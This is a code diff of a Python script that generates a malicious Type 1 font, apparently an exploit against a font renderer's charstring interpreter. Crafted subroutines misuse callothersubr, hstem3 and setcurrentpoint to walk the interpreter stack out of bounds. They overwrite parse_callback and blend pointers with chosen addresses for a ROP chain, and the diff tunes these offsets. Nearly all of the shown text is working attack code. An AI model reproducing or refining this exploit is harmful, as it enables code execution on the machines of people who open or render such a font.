@@ -42,35 +42,28 @@ file1 = 'i am also a file'
 # these are read by the ROP stuff
 subrs[0] = encode_unknown(file0)
 subrs[1] = encode_unknown(file1)
+subrs[0] = '0 3735928559 setcurrentpoint return'
 
 # start flex
 subrs[2] = '0 1 callothersubr ' + '0 2 callothersubr '*7 + 'return'
 
-# start flex, call a certain subr, then come down from 5b4 to bottom of stack - 337 down
-subrs[3] = '2 callsubr callsubr ' + 'hstem3 '*14 + '250 42 callothersubr return'
-
-# the first run up
-subrs[4] = '''3 0 setcurrentpoint
-              -347 42 callothersubr
-              callothersubr % now at 341; we could pop pop but that's useless, we need a new location first
-              hmoveto
-              setcurrentpoint
-              hmoveto
-              return'''
-
-# the second run up
-subrs[5] = '''-343 42 callothersubr
-              callothersubr
-              return'''
-
-
-main = '''0 0 setcurrentpoint
-          4 3 callsubr         % go up first time
-                               % now x is blend, and y is parse_callback
+main = '''3 0 setcurrentpoint
+          2 callsubr           % prepare for the first run up
+          -347 42 callothersubr
+          callothersubr        % now at 344
+          hmoveto hmoveto hmoveto
+          setcurrentpoint      % hint_mode and parse_callback
+                               % now at 339; want to get to 257 so we capture top
+          hstem3 hstem3 hstem3 hstem3
+          hstem3 hstem3 hstem3 hstem3
+          hstem3 hstem3 hstem3 hstem3
+          hstem3 UNKNOWN_15 UNKNOWN_15 hmoveto
+                               % now x is blend, and y is parse_callback; come back down
+          hstem3 250 42 callothersubr
           2 callsubr           % start flex so we can get x and y
           0 0 0 3 0 callothersubr pop pop
-          0 2 24 callothersubr % parse_callback -> bca[0]
-          1 2 24 callothersubr % blend -> bca[1]
+          1 2 24 callothersubr % parse_callback -> bca[1]
+          0 2 24 callothersubr % blend -> bca[0]
 
           0                    % start the <= chain
           '''
@@ -82,22 +75,30 @@ for addy, data in sorted(addies.items()):
     parse_callback, = struct.unpack('I', data[:4])
     data = data[4:]
     assert parse_callback > 32000
-    subrs[subrno] = '0 %s setcurrentpoint return' % to_signed_dec(parse_callback)
+    subrs[subrno] = '0 %s dotsection setcurrentpoint return' % to_signed_dec(parse_callback)
     #subrs[subrno+1] = encode_unknown(data)
     subrno += 1
 
     assert addy > 32000
-    main += '\n' + str(subrno) + ' 1 1 25 callothersubr pop ' + to_signed_dec(addy - 1) + ' 4 27 callothersubr pop\n'
+    # the dotsection is to make large_integer false
+    main += '\n' + str(subrno) + ' 1 1 25 callothersubr pop ' + to_signed_dec(addy - 1) + ' dotsection 4 27 callothersubr pop\n'
 
 main += '''callsubr         % call the selected subr (which should push stuff, set y to an appropriate parse_callback,
                             % then come back down
-           5 3 callsubr     % now go up the second time
+           2 callsubr       % now go up the second time
+           -344 42 callothersubr
+           callothersubr
+           hstem3 hstem3 hstem3 hstem3
+           hstem3 hstem3 hstem3 hstem3
+           hstem3 hstem3 hstem3 hstem3
+           hstem3 hstem3 hstem3
+
            0 0 0 64 64 seac % 64 = @
            endchar          % unnecessary if it worked'''
 
 subrs['main'] = main
 
-num_bca = 3 << 16 + 1
+num_bca = 3 << 16 
 
 template = open('dejavu.raw.template').read()
 template = template.replace('%BCA%', ('0 ' * num_bca)[:-1])
